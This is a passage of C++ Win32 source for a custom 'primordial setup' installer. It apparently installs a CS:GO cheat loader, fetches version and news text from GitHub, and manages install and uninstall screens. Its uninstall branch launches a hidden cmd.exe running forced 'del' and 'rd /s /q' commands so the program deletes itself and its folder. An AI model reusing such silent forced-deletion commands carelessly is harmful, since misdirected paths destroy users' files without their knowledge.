        HINTERNET hUrl = InternetOpenUrlW(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE, 0);
        if (hUrl) {
            char buffer[128] = { 0 };
            DWORD bytesRead = 0;
            if (InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = 0;
                std::string verStr(buffer);
                while (!verStr.empty() && (verStr.back() == '\n' || verStr.back() == '\r' || verStr.back() == ' '))
                    verStr.pop_back();
                g_RemoteVersionStr = std::wstring(verStr.begin(), verStr.end());
            }
            InternetCloseHandle(hUrl);
        }

        std::wstring newsUrl = L"https://raw.githubusercontent.com/barabulka14221422-commits/Primordial-CSGO/main/news.txt?t=" + std::to_wstring(GetTickCount64());
        HINTERNET hNews = InternetOpenUrlW(hInternet, newsUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE, 0);
        if (hNews) {
            std::string fullNews = "";
            char nbuf[1024];
            DWORD nRead = 0;
            while (InternetReadFile(hNews, nbuf, sizeof(nbuf), &nRead) && nRead > 0) {
                fullNews.append(nbuf, nRead);
            }
            while (!fullNews.empty() && (fullNews.back() == '\n' || fullNews.back() == '\r' || fullNews.back() == ' ')) fullNews.pop_back();
            if (fullNews != "404: Not Found" && !fullNews.empty()) {
                int wlen = MultiByteToWideChar(CP_UTF8, 0, fullNews.c_str(), -1, NULL, 0);
                if (wlen > 0) {
                    std::wstring wstr(wlen, 0);
                    MultiByteToWideChar(CP_UTF8, 0, fullNews.c_str(), -1, &wstr[0], wlen);
                    if (!wstr.empty() && wstr.back() == 0) wstr.pop_back();
                    g_NewsText = wstr;
                }
            } else {
                g_NewsText = L"";
            }
            InternetCloseHandle(hNews);
        }
        InternetCloseHandle(hInternet);
    }
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_CREATE:
    {
        DWM_WINDOW_CORNER_PREFERENCE cornerPref = DWMWCP_DONOTROUND;
        DwmSetWindowAttribute(hWnd, DWMWA_WINDOW_CORNER_PREFERENCE, &cornerPref, sizeof(cornerPref));
        
        wchar_t appData[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) {
            g_InstallDir = std::wstring(appData) + L"\\primordial";
        }
        g_InstalledLoaderPath = g_InstallDir + L"\\Primordial.exe";

        wchar_t desktop[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop))) {
            g_ShortcutPath = std::wstring(desktop) + L"\\Primordial.lnk";
        }

        if (std::filesystem::exists(g_InstalledLoaderPath)) {
            g_State = INST_PROMPT;
            g_CurrentHeight = 200;
            std::thread(FetchVersions).detach();
        } else {
            g_State = INST_TERMS;
            g_CurrentHeight = 455;
            std::thread(FetchVersions).detach();
        }

        SetTimer(hWnd, 1, 16, NULL);
        return 0;
    }

    case WM_TIMER:
        RenderWindow(hWnd);
        return 0;

    case WM_MOUSEWHEEL:
    {
        if (g_State == INST_TERMS) {
            short zDelta = GET_WHEEL_DELTA_WPARAM(wParam);
            g_TermsScrollY -= (zDelta / 4);
            if (g_TermsScrollY < 0) g_TermsScrollY = 0;
            if (g_TermsScrollY > g_TermsMaxScrollY) g_TermsScrollY = g_TermsMaxScrollY;
            InvalidateRect(hWnd, NULL, FALSE);
        }
        return 0;
    }

    case WM_NCHITTEST:
    {
        POINT pt = { LOWORD(lParam), HIWORD(lParam) };
        ScreenToClient(hWnd, &pt);
        if (g_State == INST_TERMS || g_State == INST_PROMPT || g_State == INST_DONE || g_State == INST_UNINSTALLED || g_State == INST_TRANSITION_INSTALL || g_State == INST_TRANSITION_UNINSTALL) {
            RECT cR = GetCloseRect();
            RECT b1 = GetBtn1Rect();
            RECT b2 = GetBtn2Rect();
            RECT checkR = GetTermsCheckRect();
            if (g_State != INST_UNINSTALLED && g_State != INST_TRANSITION_UNINSTALL && PtInRect(&cR, pt)) return HTCLIENT;
            if (g_State == INST_TERMS && (PtInRect(&checkR, pt) || PtInRect(&b1, pt))) return HTCLIENT;
            if (PtInRect(&b1, pt) || (g_State == INST_PROMPT && PtInRect(&b2, pt))) return HTCLIENT;
            return HTCAPTION;
        }
        return HTCAPTION; // Allow dragging by clicking the bar
    }

    case WM_MOUSEMOVE:
    {
        POINT pt = { LOWORD(lParam), HIWORD(lParam) };

        RECT cR = GetCloseRect();
        RECT b1 = GetBtn1Rect();
        RECT b2 = GetBtn2Rect();
        RECT checkR = GetTermsCheckRect();
        
        g_HoverClose = PtInRect(&cR, pt);
        g_HoverBtn1 = PtInRect(&b1, pt);
        g_HoverBtn2 = (g_State == INST_PROMPT) && PtInRect(&b2, pt);
        g_HoverTermsCheck = (g_State == INST_TERMS) && PtInRect(&checkR, pt);
            
        TRACKMOUSEEVENT tme = { sizeof(tme), TME_LEAVE, hWnd, 0 };
        TrackMouseEvent(&tme);
        return 0;
    }

    case WM_MOUSELEAVE:
        g_HoverClose = g_HoverBtn1 = g_HoverBtn2 = g_HoverTermsCheck = false;
        return 0;

    case WM_LBUTTONDOWN:
    {
        if (g_State == INST_INSTALLING || g_State == INST_UNINSTALLING || g_State == INST_TRANSITION_INSTALL || g_State == INST_TRANSITION_UNINSTALL) return 0;
        
        POINT pt = { LOWORD(lParam), HIWORD(lParam) };
        RECT cR = GetCloseRect();
        RECT b1 = GetBtn1Rect();
        RECT b2 = GetBtn2Rect();
        RECT checkR = GetTermsCheckRect();

        bool clicked = false;
        if (g_State != INST_UNINSTALLED && g_State != INST_TRANSITION_UNINSTALL && PtInRect(&cR, pt)) { clicked = true; PostQuitMessage(0); return 0; }

        if (g_State == INST_TERMS) {
            if (PtInRect(&checkR, pt)) {
                g_TermsAccepted = !g_TermsAccepted;
                // No click sound for checkbox
                return 0;
            } else if (PtInRect(&b1, pt)) {
                if (g_TermsAccepted) {
                    clicked = true;
                    g_CurrentHeight = 130;
                    std::thread([hWnd]() { RunInstall(hWnd); }).detach();
                }
            }
        } else if (g_State == INST_PROMPT) {
            if (PtInRect(&b1, pt)) { clicked = true; g_CurrentHeight = 130; std::thread([hWnd]() { RunInstall(hWnd); }).detach(); }
            if (PtInRect(&b2, pt)) { clicked = true; g_CurrentHeight = 130; std::thread([hWnd]() { RunUninstall(hWnd); }).detach(); }
        } else if (g_State == INST_DONE) {
            if (PtInRect(&b1, pt)) {
                clicked = true;
                if (std::filesystem::exists(g_InstalledLoaderPath)) {
                    ShellExecuteW(NULL, L"open", g_InstalledLoaderPath.c_str(), NULL, g_InstallDir.c_str(), SW_SHOWNORMAL);
                }
                PostQuitMessage(0);
            }
        } else if (g_State == INST_UNINSTALLED) {
            if (PtInRect(&b1, pt)) {
                clicked = true;
                wchar_t selfExe[MAX_PATH];
                GetModuleFileNameW(NULL, selfExe, MAX_PATH);

                // Check if current running setup is inside g_InstallDir
                std::wstring selfStr(selfExe);
                bool isInsideInstallDir = false;
                if (!g_InstallDir.empty() && selfStr.length() >= g_InstallDir.length()) {
                    if (_wcsnicmp(selfStr.c_str(), g_InstallDir.c_str(), g_InstallDir.length()) == 0) {
                        isInsideInstallDir = true;
                    }
                }

                if (isInsideInstallDir) {
                    // Only delete selfExe and directory if running from inside installDir
                    std::wstring cmd = L"/c ping 127.0.0.1 -n 2 > nul & del /f /q \"" + selfStr + L"\" & rd /s /q \"" + g_InstallDir + L"\"";
                    ShellExecuteW(NULL, L"open", L"cmd.exe", cmd.c_str(), NULL, SW_HIDE);
                } else {
                    // If running from Desktop/Downloads, just delete installDir and leave this setup.exe untouched!
                    std::wstring cmd = L"/c ping 127.0.0.1 -n 2 > nul & rd /s /q \"" + g_InstallDir + L"\"";
                    ShellExecuteW(NULL, L"open", L"cmd.exe", cmd.c_str(), NULL, SW_HIDE);
                }
                PostQuitMessage(0);
            }
        }
        
        if (clicked) {
            PlaySoundW(MAKEINTRESOURCEW(IDR_SOUND_CLICK), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC);
        }
        return 0;
    }

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        BeginPaint(hWnd, &ps);
        EndPaint(hWnd, &ps);
        return 0;
    }

    case WM_DESTROY:
        KillTimer(hWnd, 1);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hWnd, message, wParam, lParam);
}

int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE, LPWSTR, int nCmdShow)
{
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    WNDCLASSEXW wcex = { sizeof(wcex) };
    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.hInstance = hInstance;
    wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wcex.lpszClassName = L"PrimordialInstallerClass";
    wcex.hIcon = LoadIconW(hInstance, MAKEINTRESOURCEW(IDI_APP_ICON));
    wcex.hIconSm = LoadIconW(hInstance, MAKEINTRESOURCEW(IDI_APP_ICON));
    RegisterClassExW(&wcex);

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    int posX = (screenW - WND_WIDTH) / 2;
    int posY = (screenH - 180) / 2;

    HWND hWnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TOPMOST,
        L"PrimordialInstallerClass",
        L"primordial setup",
        WS_POPUP | WS_VISIBLE,
        posX, posY, WND_WIDTH, 130,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    Gdiplus::GdiplusShutdown(gdiplusToken);
    return (int)msg.wParam;
}
